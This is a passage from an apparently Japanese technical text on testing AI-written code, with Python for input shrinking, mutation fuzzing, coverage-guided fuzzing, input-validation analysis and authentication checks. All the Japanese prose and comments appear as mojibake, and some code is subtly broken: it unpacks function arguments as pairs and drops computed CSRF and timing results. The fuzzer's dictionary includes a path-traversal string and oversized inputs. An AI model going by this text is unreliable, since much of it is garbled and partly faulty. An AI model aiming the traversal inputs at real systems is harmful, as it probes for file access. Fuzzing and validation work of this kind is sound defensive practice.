        property: Property,
        failing_input: Dict
    ) -> Dict:
        """å¤±æ•—ã™ã‚‹å…¥åŠ›ã‚’æœ€å°åŒ–"""
        
        current = failing_input.copy()
        
        # å„ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é †ã«æœ€å°åŒ–
        for param_name, value in current.items():
            shrinker = self._get_shrinker(type(value))
            
            for smaller_value in shrinker(value):
                test_input = current.copy()
                test_input[param_name] = smaller_value
                
                try:
                    result = function(**test_input)
                    # ã¾ã ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£é•åã™ã‚‹ã‹ç¢ºèª
                    if not property.check(test_input, result):
                        current[param_name] = smaller_value
                    else:
                        break  # ã“ã‚Œä»¥ä¸Šå°ã•ãã§ããªã„
                except:
                    # ã‚¨ãƒ©ãƒ¼ãŒç¶™ç¶šã™ã‚‹å ´åˆã‚‚æœ€å°åŒ–ã‚’ç¶šã‘ã‚‹
                    current[param_name] = smaller_value
        
        return current
```

**ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒ™ãƒ¼ã‚¹ã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ**

```python
class MutationBasedEdgeCaseGenerator:
    """æ—¢å­˜ã®å…¥åŠ›ã‚’å¤‰ç•°ã•ã›ã¦ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã‚’ç”Ÿæˆ"""
    
    def __init__(self):
        self.mutators = self._initialize_mutators()
    
    def generate_mutations(
        self,
        seed_inputs: List[Dict],
        mutation_rounds: int = 10
    ) -> List[MutatedInput]:
        """ã‚·ãƒ¼ãƒ‰å…¥åŠ›ã‹ã‚‰å¤‰ç•°ã«ã‚ˆã‚‹ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ"""
        
        mutated_inputs = []
        current_generation = seed_inputs.copy()
        
        for round in range(mutation_rounds):
            next_generation = []
            
            for input_data in current_generation:
                # è¤‡æ•°ã®å¤‰ç•°æˆ¦ç•¥ã‚’é©ç”¨
                mutations = self._apply_mutations(input_data)
                
                for mutated in mutations:
                    mutated_input = MutatedInput(
                        original=input_data,
                        mutated=mutated,
                        mutation_type=mutated.mutation_type,
                        generation=round + 1
                    )
                    mutated_inputs.append(mutated_input)
                    next_generation.append(mutated)
            
            # èˆˆå‘³æ·±ã„å¤‰ç•°ã‚’é¸æŠï¼ˆãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ãƒ™ãƒ¼ã‚¹ï¼‰
            current_generation = self._select_interesting_mutations(
                next_generation
            )
        
        return mutated_inputs
    
    def _apply_mutations(self, input_data: Dict) -> List[Dict]:
        """å…¥åŠ›ãƒ‡ãƒ¼ã‚¿ã«å¤‰ç•°ã‚’é©ç”¨"""
        
        mutations = []
        
        for key, value in input_data.items():
            # å€¤ã®å‹ã«å¿œã˜ãŸå¤‰ç•°
            if isinstance(value, str):
                mutations.extend(self._mutate_string(input_data, key, value))
            elif isinstance(value, (int, float)):
                mutations.extend(self._mutate_number(input_data, key, value))
            elif isinstance(value, list):
                mutations.extend(self._mutate_array(input_data, key, value))
            elif isinstance(value, dict):
                mutations.extend(self._mutate_object(input_data, key, value))
        
        # æ§‹é€ çš„ãªå¤‰ç•°
        mutations.extend(self._structural_mutations(input_data))
        
        return mutations
    
    def _mutate_string(
        self,
        base_input: Dict,
        key: str,
        value: str
    ) -> List[Dict]:
        """æ–‡å­—åˆ—ã®å¤‰ç•°ãƒ‘ã‚¿ãƒ¼ãƒ³"""
        
        mutations = []
        
        # æ–‡å­—ã®å‰Šé™¤
        if len(value) > 0:
            for i in range(len(value)):
                mutated = base_input.copy()
                mutated[key] = value[:i] + value[i+1:]
                mutated['mutation_type'] = f"delete_char_at_{i}"
                mutations.append(mutated)
        
        # æ–‡å­—ã®è¤‡è£½
        for i in range(len(value)):
            mutated = base_input.copy()
            mutated[key] = value[:i] + value[i] + value[i:]
            mutated['mutation_type'] = f"duplicate_char_at_{i}"
            mutations.append(mutated)
        
        # ç‰¹æ®Šæ–‡å­—ã®æŒ¿å…¥
        special_chars = ['\0', '\n', '\r', '\t', '\\', '"', "'", '<', '>']
        for char in special_chars:
            for i in range(len(value) + 1):
                mutated = base_input.copy()
                mutated[key] = value[:i] + char + value[i:]
                mutated['mutation_type'] = f"insert_{ord(char)}_at_{i}"
                mutations.append(mutated)
        
        # ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®å¤‰æ›´
        encoding_mutations = [
            value.encode('utf-8').decode('latin-1', errors='ignore'),
            value.encode('utf-16').decode('utf-8', errors='ignore'),
        ]
        
        for i, encoded in enumerate(encoding_mutations):
            if encoded != value:
                mutated = base_input.copy()
                mutated[key] = encoded
                mutated['mutation_type'] = f"encoding_mutation_{i}"
                mutations.append(mutated)
        
        return mutations
```

**ãƒ•ã‚¡ã‚¸ãƒ³ã‚°ãƒ™ãƒ¼ã‚¹ã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ**

```python
class IntelligentFuzzer:
    """ã‚¤ãƒ³ãƒ†ãƒªã‚¸ã‚§ãƒ³ãƒˆãƒ•ã‚¡ã‚¸ãƒ³ã‚°ã«ã‚ˆã‚‹ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ"""
    
    def __init__(self):
        self.coverage_tracker = CoverageTracker()
        self.feedback_analyzer = FeedbackAnalyzer()
        self.corpus = Corpus()
    
    def fuzz_function(
        self,
        target_function: Callable,
        initial_corpus: List[Dict],
        time_budget: int = 3600
    ) -> FuzzingResult:
        """ã‚«ãƒãƒ¬ãƒƒã‚¸ã‚¬ã‚¤ãƒ‰ãƒ•ã‚¡ã‚¸ãƒ³ã‚°"""
        
        start_time = time.time()
        result = FuzzingResult()
        
        # åˆæœŸã‚³ãƒ¼ãƒ‘ã‚¹ã‚’ã‚»ãƒƒãƒˆ
        for input_data in initial_corpus:
            self.corpus.add(input_data)
        
        while time.time() - start_time < time_budget:
            # ã‚³ãƒ¼ãƒ‘ã‚¹ã‹ã‚‰å…¥åŠ›ã‚’é¸æŠ
            base_input = self.corpus.select_input()
            
            # å¤‰ç•°ã‚’é©ç”¨
            mutated_input = self._smart_mutation(base_input)
            
            # å®Ÿè¡Œã¨ã‚«ãƒãƒ¬ãƒƒã‚¸åé›†
            coverage_before = self.coverage_tracker.get_coverage()
            
            try:
                output = target_function(**mutated_input)
                execution_result = ExecutionResult(
                    input=mutated_input,
                    output=output,
                    error=None
                )
            except Exception as e:
                execution_result = ExecutionResult(
                    input=mutated_input,
                    output=None,
                    error=e
                )
                # ã‚¨ãƒ©ãƒ¼ã¯èˆˆå‘³æ·±ã„ã‚±ãƒ¼ã‚¹
                result.add_crash(execution_result)
            
            coverage_after = self.coverage_tracker.get_coverage()
            
            # æ–°ã—ã„ã‚«ãƒãƒ¬ãƒƒã‚¸ã‚’ç™ºè¦‹ã—ãŸå ´åˆ
            if self._has_new_coverage(coverage_before, coverage_after):
                self.corpus.add(mutated_input)
                result.add_interesting_input(execution_result)
            
            # ãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯åˆ†æ
            feedback = self.feedback_analyzer.analyze(
                execution_result,
                coverage_after
            )
            
            # æˆ¦ç•¥ã®èª¿æ•´
            self._adjust_strategy(feedback)
        
        return result
    
    def _smart_mutation(self, base_input: Dict) -> Dict:
        """ãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ã«åŸºã¥ãã‚¹ãƒãƒ¼ãƒˆãªå¤‰ç•°"""
        
        # å¤‰ç•°æˆ¦ç•¥ã®é¸æŠï¼ˆéå»ã®æˆåŠŸã«åŸºã¥ãï¼‰
        strategy = self._select_mutation_strategy()
        
        if strategy == 'havoc':
            # è¤‡æ•°ã®å¤‰ç•°ã‚’çµ„ã¿åˆã‚ã›ã‚‹
            return self._havoc_mutation(base_input)
        elif strategy == 'dictionary':
            # è¾æ›¸ãƒ™ãƒ¼ã‚¹ã®å¤‰ç•°
            return self._dictionary_mutation(base_input)
        elif strategy == 'arithmetic':
            # ç®—è¡“çš„ãªå¤‰ç•°
            return self._arithmetic_mutation(base_input)
        elif strategy == 'interesting_values':
            # èˆˆå‘³æ·±ã„å€¤ã¸ã®ç½®æ›
            return self._interesting_value_mutation(base_input)
        else:
            # åŸºæœ¬çš„ãªå¤‰ç•°
            return self._basic_mutation(base_input)
    
    def _interesting_value_mutation(self, base_input: Dict) -> Dict:
        """èˆˆå‘³æ·±ã„å€¤ã«ã‚ˆã‚‹å¤‰ç•°"""
        
        interesting_integers = [
            0, -1, 1,
            127, 128, 255, 256,  # 8ãƒ“ãƒƒãƒˆå¢ƒç•Œ
            32767, 32768, 65535, 65536,  # 16ãƒ“ãƒƒãƒˆå¢ƒç•Œ
            2147483647, 2147483648,  # 32ãƒ“ãƒƒãƒˆå¢ƒç•Œ
            -2147483648, -2147483647,
        ]
        
        interesting_strings = [
            "",
            "null", "NULL", "nil", "None",
            "true", "false", "True", "False",
            "0", "-1", "1",
            "NaN", "Infinity", "-Infinity",
            "../" * 10,  # ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«
            "A" * 1000000,  # å¤§ããªæ–‡å­—åˆ—
        ]
        
        mutated = base_input.copy()
        
        # ãƒ©ãƒ³ãƒ€ãƒ ãªãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’é¸æŠã—ã¦ç½®æ›
        field = random.choice(list(mutated.keys()))
        
        if isinstance(mutated[field], int):
            mutated[field] = random.choice(interesting_integers)
        elif isinstance(mutated[field], str):
            mutated[field] = random.choice(interesting_strings)
        
        return mutated
```

## 5.2 ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ›ãƒ¼ãƒ«ã®æ¤œå‡º

### 5.2.1 å…¥åŠ›æ¤œè¨¼ã®ä¸å‚™ãƒ‘ã‚¿ãƒ¼ãƒ³

**ãªãœå…¥åŠ›æ¤œè¨¼ãŒé‡è¦ãªã®ã‹**

ã€Œã™ã¹ã¦ã®å…¥åŠ›ã¯æ‚ªæ„ã‚ã‚‹ã‚‚ã®ã¨è¦‹ãªã›ã€ã¨ã„ã†ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åŸºæœ¬åŸå‰‡ãŒã‚ã‚‹ã€‚AIã¯ã€Œé€šå¸¸ã®ã€ä½¿ç”¨ãƒ‘ã‚¿ãƒ¼ãƒ³ã‹ã‚‰å­¦ç¿’ã™ã‚‹ãŸã‚ã€æ‚ªæ„ã‚ã‚‹å…¥åŠ›ã¸ã®å¯¾å‡¦ã‚’è€ƒæ…®ã—ãªã„ã“ã¨ãŒå¤šã„ã€‚å…¥åŠ›æ¤œè¨¼ã®ä¸å‚™ã¯ã€å¤šãã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã®æ ¹æœ¬åŸå› ã§ã‚ã‚‹ã€‚

**AIãŒè¦‹é€ƒã—ã‚„ã™ã„å…¥åŠ›æ¤œè¨¼ãƒ‘ã‚¿ãƒ¼ãƒ³**

```python
class InputValidationAnalyzer:
    """å…¥åŠ›æ¤œè¨¼ã®ä¸å‚™ã‚’æ¤œå‡ºã™ã‚‹åˆ†æå™¨"""
    
    def __init__(self):
        self.validation_patterns = self._initialize_patterns()
        self.attack_vectors = self._load_attack_vectors()
    
    def analyze_input_validation(
        self,
        code: str,
        function_metadata: FunctionMetadata
    ) -> List[ValidationIssue]:
        """å…¥åŠ›æ¤œè¨¼ã®ä¸å‚™ã‚’åˆ†æ"""
        
        issues = []
        ast_tree = ast.parse(code)
        
        # å„é–¢æ•°ã‚’åˆ†æ
        for node in ast.walk(ast_tree):
            if isinstance(node, ast.FunctionDef):
                # ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ¤œè¨¼çŠ¶æ³ã‚’è¿½è·¡
                param_validations = self._track_parameter_validation(
                    node,
                    function_metadata
                )
                
                # å„ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ¤œè¨¼ä¸å‚™ã‚’ãƒã‚§ãƒƒã‚¯
                for param_name, param_info in node.args.args:
                    validation_status = param_validations.get(param_name)
                    
                    if not validation_status or validation_status.is_weak:
                        issue = self._create_validation_issue(
                            function_name=node.name,
                            param_name=param_name,
                            param_type=param_info.expected_type,
                            validation_status=validation_status
                        )
                        issues.append(issue)
        
        return issues
    
    def _track_parameter_validation(
        self,
        function_node: ast.FunctionDef,
        metadata: FunctionMetadata
    ) -> Dict[str, ValidationStatus]:
        """ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ¤œè¨¼ã‚’è¿½è·¡"""
        
        validations = {}
        
        # é–¢æ•°æœ¬ä½“ã‚’èµ°æŸ»
        for node in ast.walk(function_node):
            # å‹ãƒã‚§ãƒƒã‚¯
            if isinstance(node, ast.Call) and self._is_type_check(node):
                param = self._extract_checked_param(node)
                if param:
                    validations[param] = validations.get(param, ValidationStatus())
                    validations[param].has_type_check = True
            
            # ç¯„å›²ãƒã‚§ãƒƒã‚¯
            if isinstance(node, ast.Compare) and self._is_range_check(node):
                param = self._extract_compared_param(node)
                if param:
                    validations[param] = validations.get(param, ValidationStatus())
                    validations[param].has_range_check = True
            
            # æ­£è¦è¡¨ç¾ãƒã‚§ãƒƒã‚¯
            if isinstance(node, ast.Call) and self._is_regex_check(node):
                param = self._extract_regex_param(node)
                if param:
                    validations[param] = validations.get(param, ValidationStatus())
                    validations[param].has_format_check = True
                    # æ­£è¦è¡¨ç¾ã®å“è³ªã‚‚è©•ä¾¡
                    validations[param].regex_quality = self._evaluate_regex(node)
        
        return validations
    
    def _create_validation_issue(
        self,
        function_name: str,
        param_name: str,
        param_type: str,
        validation_status: ValidationStatus
    ) -> ValidationIssue:
        """æ¤œè¨¼ä¸å‚™ã®è©³ç´°ãªèª¬æ˜ã‚’ç”Ÿæˆ"""
        
        issue = ValidationIssue(
            function=function_name,
            parameter=param_name,
            severity=self._calculate_severity(param_type, validation_status)
        )
        
        # ä¸è¶³ã—ã¦ã„ã‚‹æ¤œè¨¼ã‚’ç‰¹å®š
        missing_validations = []
        
        if param_type == 'string':
            if not validation_status.has_length_check:
                missing_validations.append("é•·ã•ãƒã‚§ãƒƒã‚¯")
            if not validation_status.has_format_check:
                missing_validations.append("ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ¤œè¨¼")
            if not validation_status.has_encoding_check:
                missing_validations.append("ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ¤œè¨¼")
            if not validation_status.has_injection_prevention:
                missing_validations.append("ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–")
        
        elif param_type in ['int', 'float']:
            if not validation_status.has_range_check:
                missing_validations.append("ç¯„å›²ãƒã‚§ãƒƒã‚¯")
            if not validation_status.has_overflow_check:
                missing_validations.append("ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼å¯¾ç­–")
        
        elif param_type == 'list':
            if not validation_status.has_size_check:
                missing_validations.append("ã‚µã‚¤ã‚ºãƒã‚§ãƒƒã‚¯")
            if not validation_status.has_element_validation:
                missing_validations.append("è¦ç´ ã®æ¤œè¨¼")
        
        issue.missing_validations = missing_validations
        issue.attack_vectors = self._generate_attack_vectors(
            param_type,
            missing_validations
        )
        issue.fix_recommendation = self._generate_fix(
            param_type,
            missing_validations
        )
        
        return issue
```

**å…·ä½“çš„ãªå…¥åŠ›æ¤œè¨¼ãƒ‘ã‚¿ãƒ¼ãƒ³ã¨å¯¾ç­–**

```python
class SecureInputValidator:
    """ã‚»ã‚­ãƒ¥ã‚¢ãªå…¥åŠ›æ¤œè¨¼ã®å®Ÿè£…ãƒ‘ã‚¿ãƒ¼ãƒ³"""
    
    def validate_string_input(
        self,
        value: Any,
        field_name: str,
        constraints: StringConstraints
    ) -> str:
        """æ–‡å­—åˆ—å…¥åŠ›ã®åŒ…æ‹¬çš„ãªæ¤œè¨¼"""
        
        # å‹ãƒã‚§ãƒƒã‚¯
        if not isinstance(value, str):
            raise ValidationError(f"{field_name} must be a string")
        
        # é•·ã•ãƒã‚§ãƒƒã‚¯
        if constraints.min_length and len(value) < constraints.min_length:
            raise ValidationError(
                f"{field_name} must be at least {constraints.min_length} characters"
            )
        
        if constraints.max_length and len(value) > constraints.max_length:
            raise ValidationError(
                f"{field_name} must not exceed {constraints.max_length} characters"
            )
        
        # ç©ºç™½ã®ã¿ã®ãƒã‚§ãƒƒã‚¯
        if constraints.no_whitespace_only and value.strip() == "":
            raise ValidationError(f"{field_name} cannot be only whitespace")
        
        # æ–‡å­—ç¨®ã®æ¤œè¨¼
        if constraints.allowed_chars:
            pattern = f"^[{re.escape(constraints.allowed_chars)}]*$"
            if not re.match(pattern, value):
                raise ValidationError(
                    f"{field_name} contains invalid characters"
                )
        
        # ç¦æ­¢ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ãƒã‚§ãƒƒã‚¯
        for pattern in self._get_dangerous_patterns():
            if pattern in value.lower():
                raise ValidationError(
                    f"{field_name} contains potentially dangerous content"
                )
        
        # ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®æ¤œè¨¼
        try:
            value.encode('utf-8').decode('utf-8')
        except UnicodeError:
            raise ValidationError(f"{field_name} contains invalid encoding")
        
        # æ­£è¦åŒ–
        normalized = unicodedata.normalize('NFKC', value)
        
        # SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–
        if self._contains_sql_keywords(normalized):
            # ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã¾ãŸã¯æ‹’å¦
            if constraints.strict_mode:
                raise ValidationError(
                    f"{field_name} contains SQL-like patterns"
                )
            else:
                normalized = self._escape_sql(normalized)
        
        # XSSå¯¾ç­–
        if self._contains_html_tags(normalized):
            if constraints.strict_mode:
                raise ValidationError(
                    f"{field_name} contains HTML-like content"
                )
            else:
                normalized = self._sanitize_html(normalized)
        
        return normalized
    
    def validate_numeric_input(
        self,
        value: Any,
        field_name: str,
        constraints: NumericConstraints
    ) -> Union[int, float]:
        """æ•°å€¤å…¥åŠ›ã®åŒ…æ‹¬çš„ãªæ¤œè¨¼"""
        
        # å‹å¤‰æ›ã¨åŸºæœ¬æ¤œè¨¼
        try:
            if constraints.type == 'integer':
                numeric_value = int(value)
            else:
                numeric_value = float(value)
        except (ValueError, TypeError):
            raise ValidationError(f"{field_name} must be a valid number")
        
        # NaN, Infinity ãƒã‚§ãƒƒã‚¯
        if isinstance(numeric_value, float):
            if math.isnan(numeric_value):
                raise ValidationError(f"{field_name} cannot be NaN")
            if math.isinf(numeric_value):
                raise ValidationError(f"{field_name} cannot be infinity")
        
        # ç¯„å›²ãƒã‚§ãƒƒã‚¯
        if constraints.min_value is not None and numeric_value < constraints.min_value:
            raise ValidationError(
                f"{field_name} must be at least {constraints.min_value}"
            )
        
        if constraints.max_value is not None and numeric_value > constraints.max_value:
            raise ValidationError(
                f"{field_name} must not exceed {constraints.max_value}"
            )
        
        # æ•´æ•°ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®ãƒã‚§ãƒƒã‚¯
        if constraints.type == 'integer':
            if numeric_value > sys.maxsize or numeric_value < -sys.maxsize - 1:
                raise ValidationError(f"{field_name} causes integer overflow")
        
        # ç²¾åº¦ã®æ¤œè¨¼ï¼ˆå°æ•°ã®å ´åˆï¼‰
        if constraints.decimal_places is not None:
            decimal_str = str(numeric_value).split('.')
            if len(decimal_str) > 1 and len(decimal_str[1]) > constraints.decimal_places:
                raise ValidationError(
                    f"{field_name} exceeds allowed decimal places"
                )
        
        return numeric_value
    
    def validate_file_upload(
        self,
        file_data: FileUpload,
        constraints: FileConstraints
    ) -> ValidatedFile:
        """ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã®åŒ…æ‹¬çš„ãªæ¤œè¨¼"""
        
        # ãƒ•ã‚¡ã‚¤ãƒ«ã‚µã‚¤ã‚º
        if file_data.size > constraints.max_size:
            raise ValidationError(
                f"File size ({file_data.size}) exceeds maximum allowed "
                f"({constraints.max_size})"
            )
        
        # ãƒ•ã‚¡ã‚¤ãƒ«åã®æ¤œè¨¼
        safe_filename = self._sanitize_filename(file_data.filename)
        
        # æ‹¡å¼µå­ã®æ¤œè¨¼
        _, ext = os.path.splitext(safe_filename)
        if ext.lower() not in constraints.allowed_extensions:
            raise ValidationError(f"File type {ext} is not allowed")
        
        # MIMEã‚¿ã‚¤ãƒ—ã®æ¤œè¨¼ï¼ˆæ‹¡å¼µå­å½è£…å¯¾ç­–ï¼‰
        detected_mime = magic.from_buffer(file_data.content, mime=True)
        if detected_mime not in constraints.allowed_mimes:
            raise ValidationError(
                f"File content type ({detected_mime}) does not match allowed types"
            )
        
        # ãƒã‚¸ãƒƒã‚¯ãƒŠãƒ³ãƒãƒ¼ã®æ¤œè¨¼
        if not self._verify_magic_number(file_data.content, ext):
            raise ValidationError("File content does not match extension")
        
        # ã‚¦ã‚¤ãƒ«ã‚¹ã‚¹ã‚­ãƒ£ãƒ³ï¼ˆå®Ÿè£…ã¯ç’°å¢ƒä¾å­˜ï¼‰
        if constraints.require_antivirus_scan:
            scan_result = self._scan_for_malware(file_data.content)
            if scan_result.is_infected:
                raise ValidationError(f"File contains malware: {scan_result.threat}")
        
        # ç”»åƒã®å ´åˆã®è¿½åŠ æ¤œè¨¼
        if detected_mime.startswith('image/'):
            self._validate_image_file(file_data.content, constraints)
        
        return ValidatedFile(
            filename=safe_filename,
            content=file_data.content,
            mime_type=detected_mime,
            size=file_data.size
        )
```

### 5.2.2 èªè¨¼ãƒ»èªå¯ã®å®Ÿè£…ç¢ºèª

**èªè¨¼ã¨èªå¯ã®é•ã„ã¨é‡è¦æ€§**

èªè¨¼ï¼ˆAuthenticationï¼‰ã¯ã€Œèª°ã§ã‚ã‚‹ã‹ã€ã‚’ç¢ºèªã—ã€èªå¯ï¼ˆAuthorizationï¼‰ã¯ã€Œä½•ãŒã§ãã‚‹ã‹ã€ã‚’åˆ¶å¾¡ã™ã‚‹ã€‚AIã¯ä¸¡è€…ã‚’æ··åŒã—ãŸã‚Šã€ä¸€æ–¹ã®ã¿ã‚’å®Ÿè£…ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚ã“ã®åŒºåˆ¥ã®ç†è§£ã¨é©åˆ‡ãªå®Ÿè£…ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åŸºæœ¬ã§ã‚ã‚‹ã€‚

**èªè¨¼ãƒ»èªå¯ã®å®Ÿè£…ãƒ‘ã‚¿ãƒ¼ãƒ³åˆ†æ**

```python
class AuthenticationAuthorizationAnalyzer:
    """èªè¨¼ãƒ»èªå¯ã®å®Ÿè£…ã‚’åˆ†æ"""
    
    def analyze_auth_implementation(
        self,
        codebase: Codebase
    ) -> AuthAnalysisReport:
        """èªè¨¼ãƒ»èªå¯ã®å®Ÿè£…ã‚’åŒ…æ‹¬çš„ã«åˆ†æ"""
        
        report = AuthAnalysisReport()
        
        # èªè¨¼ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã®æ¤œå‡º
        auth_mechanisms = self._detect_authentication_mechanisms(codebase)
        report.authentication = self._analyze_authentication(auth_mechanisms)
        
        # èªå¯ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã®æ¤œå‡º
        authz_mechanisms = self._detect_authorization_mechanisms(codebase)
        report.authorization = self._analyze_authorization(authz_mechanisms)
        
        # å…±é€šã®å•é¡Œãƒ‘ã‚¿ãƒ¼ãƒ³ã®æ¤œå‡º
        report.vulnerabilities = self._detect_auth_vulnerabilities(
            codebase,
            auth_mechanisms,
            authz_mechanisms
        )
        
        # æ¨å¥¨äº‹é …ã®ç”Ÿæˆ
        report.recommendations = self._generate_recommendations(report)
        
        return report
    
    def _detect_auth_vulnerabilities(
        self,
        codebase: Codebase,
        auth_mechanisms: List[AuthMechanism],
        authz_mechanisms: List[AuthzMechanism]
    ) -> List[SecurityVulnerability]:
        """èªè¨¼ãƒ»èªå¯ã®è„†å¼±æ€§ã‚’æ¤œå‡º"""
        
        vulnerabilities = []
        
        # 1. ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸèªè¨¼æƒ…å ±
        hardcoded_creds = self._find_hardcoded_credentials(codebase)
        for cred in hardcoded_creds:
            vulnerabilities.append(SecurityVulnerability(
                type="HARDCODED_CREDENTIALS",
                severity="CRITICAL",
                location=cred.location,
                description="èªè¨¼æƒ…å ±ãŒã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã«ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã¾ã™",
                example=cred.code_snippet,
                fix=self._generate_credential_fix(cred)
            ))
        
        # 2. å¼±ã„ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç†
        session_issues = self._analyze_session_management(codebase)
        for issue in session_issues:
            if issue.type == "PREDICTABLE_SESSION_ID":
                vulnerabilities.append(SecurityVulnerability(
                    type="WEAK_SESSION_MANAGEMENT",
                    severity="HIGH",
                    description="ã‚»ãƒƒã‚·ãƒ§ãƒ³IDãŒäºˆæ¸¬å¯èƒ½ã§ã™",
                    details=issue.details,
                    fix=self._generate_session_fix(issue)
                ))
        
        # 3. ä¸é©åˆ‡ãªèªå¯ãƒã‚§ãƒƒã‚¯
        authz_issues = self._analyze_authorization_checks(codebase)
        for issue in authz_issues:
            if issue.type == "MISSING_AUTHZ_CHECK":
                vulnerabilities.append(SecurityVulnerability(
                    type="MISSING_AUTHORIZATION",
                    severity="HIGH",
                    location=issue.location,
                    description="èªå¯ãƒã‚§ãƒƒã‚¯ãŒæ¬ è½ã—ã¦ã„ã¾ã™",
                    affected_endpoints=issue.endpoints,
                    fix=self._generate_authz_fix(issue)
                ))
        
        # 4. CSRFå¯¾ç­–ã®æ¬ å¦‚
        csrf_issues = self._check_csrf_protection(codebase)
        
        # 5. ã‚¿ã‚¤ãƒŸãƒ³ã‚°æ”»æ’ƒã®è„†å¼±æ€§
        timing_issues = self._check_timing_attacks(codebase)
        
        return vulnerabilities
    
    def _analyze_authentication(
        self,
        mechanisms: List[AuthMechanism]
    ) -> AuthenticationAnalysis:
        """èªè¨¼å®Ÿè£…ã®è©³ç´°åˆ†æ"""
        
        analysis = AuthenticationAnalysis()
        
        for mechanism in mechanisms:
            # ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹èªè¨¼ã®åˆ†æ
            if mechanism.type == "PASSWORD":
                password_analysis = self._analyze_password_auth(mechanism)
                
                # ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã®ãƒã‚§ãƒƒã‚¯
                if not password_analysis.has_complexity_requirements:
                    analysis.add_issue(
                        "WEAK_PASSWORD_POLICY",
                        "ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¤‡é›‘æ€§è¦ä»¶ãŒä¸è¶³ã—ã¦ã„ã¾ã™"
                    )
                
                # ãƒãƒƒã‚·ãƒ¥ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã®ãƒã‚§ãƒƒã‚¯
                if password_analysis.hash_algorithm in ['md5', 'sha1']:
                    analysis.add_issue(
                        "WEAK_HASH_ALGORITHM",
                        f"å¼±ã„ãƒãƒƒã‚·ãƒ¥ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ : {password_analysis.hash_algorithm}"
                    )
                
                # ã‚½ãƒ«ãƒˆã®ä½¿ç”¨ãƒã‚§ãƒƒã‚¯
                if not password_analysis.uses_salt:
                    analysis.add_issue(
                        "NO_PASSWORD_SALT",
                        "ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã«ã‚½ãƒ«ãƒˆãŒä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã›ã‚“"
                    )
            
            # ãƒˆãƒ¼ã‚¯ãƒ³ãƒ™ãƒ¼ã‚¹èªè¨¼ã®åˆ†æ
            elif mechanism.type == "TOKEN":
                token_analysis = self._analyze_token_auth(mechanism)
                
                # ãƒˆãƒ¼ã‚¯ãƒ³ã®æœ‰åŠ¹æœŸé™
                if not token_analysis.has_expiration:
                    analysis.add_issue(
                        "NO_TOKEN_EXPIRATION",
                        "ãƒˆãƒ¼ã‚¯ãƒ³ã«æœ‰åŠ¹æœŸé™ãŒè¨­å®šã•ã‚Œã¦ã„ã¾ã›ã‚“"
                    )
                
                # ãƒˆãƒ¼ã‚¯ãƒ³ã®ç½²åæ¤œè¨¼
                if not token_analysis.is_signed:
                    analysis.add_issue(
                        "UNSIGNED_TOKEN",
                        "ãƒˆãƒ¼ã‚¯ãƒ³ãŒç½²åã•ã‚Œã¦ã„ã¾ã›ã‚“"
                    )
        
        return analysis
```

**ã‚»ã‚­ãƒ¥ã‚¢ãªèªè¨¼ãƒ»èªå¯ã®å®Ÿè£…ãƒ‘ã‚¿ãƒ¼ãƒ³**

```python
class SecureAuthImplementation:
    """ã‚»ã‚­ãƒ¥ã‚¢ãªèªè¨¼ãƒ»èªå¯ã®å®Ÿè£…ä¾‹"""
    
    def __init__(self):
        self.password_hasher = Argon2PasswordHasher()
        self.token_manager = JWTManager()
